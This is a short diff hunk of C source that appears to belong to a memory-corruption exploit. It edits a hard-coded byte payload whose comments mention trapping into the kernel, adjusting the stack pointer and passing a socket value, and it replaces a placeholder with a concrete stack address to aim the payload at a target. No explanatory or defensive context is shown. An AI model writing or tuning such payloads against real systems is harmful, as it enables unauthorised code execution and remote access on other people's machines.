@@ -65,7 +65,7 @@ int main(void)
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x21\x16\xac\xbb" // add 28 to esp (to skip params on stack)
                       "\xaa\xaa\xaa\xaa" // socket value of eax
-                      "\x01\x01\x01\x01" // addy of x struct
+                      "\xac\x29\xbf\xbf" // addy of x struct
                       "\xaa\xaa\xaa\xaa" // four-byte value 16
                       ""
                       // "\xaa"
